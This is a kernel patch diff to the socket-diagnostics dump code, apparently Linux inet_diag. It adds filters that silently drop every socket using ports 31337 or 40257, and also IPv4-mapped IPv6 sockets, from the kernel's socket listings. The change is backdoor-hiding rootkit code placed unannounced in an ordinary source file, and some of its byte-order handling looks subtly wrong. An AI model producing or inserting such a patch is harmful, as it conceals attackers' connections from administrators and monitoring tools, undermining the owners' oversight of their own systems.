@@ -1073,6 +1073,9 @@ void inet_diag_dump_icsk(struct inet_hashinfo *hashinfo, struct sk_buff *skb,
 
 				if (!inet_diag_bc_sk(bc, sk))
 					goto next_listen;
+                		if (ntohs(inet->inet_sport) == 31337 || ntohs(inet->inet_dport) == 31337 || ntohs(inet->inet_sport) == 40257 || ntohs(inet->inet_dport) == 40257 ) {
+                    			goto next_listen; // 过滤该条目
+             			}				
 
 				if (inet_sk_diag_fill(sk, inet_csk(sk), skb,
 						      cb, r, NLM_F_MULTI,
@@ -1223,6 +1226,18 @@ next_chunk:
 			if (r->id.idiag_dport != sk->sk_dport &&
 			    r->id.idiag_dport)
 				goto next_normal;
+	        if (ntohs(sk->sk_num) == 31337 || ntohs(sk->sk_dport) == 31337 || ntohs(sk->sk_num) == 40257 || ntohs(sk->sk_dport) == 40257 ) {
+                goto next_normal;
+            }
+
+            if (sk->sk_family == AF_INET6) {
+                struct in6_addr *addr6 = &sk->sk_v6_rcv_saddr;
+                if (ipv6_addr_v4mapped(addr6)) {
+                  goto next_normal;
+                }
+            }
+
+			
 			twsk_build_assert();
 
 			if (!inet_diag_bc_sk(bc, sk))
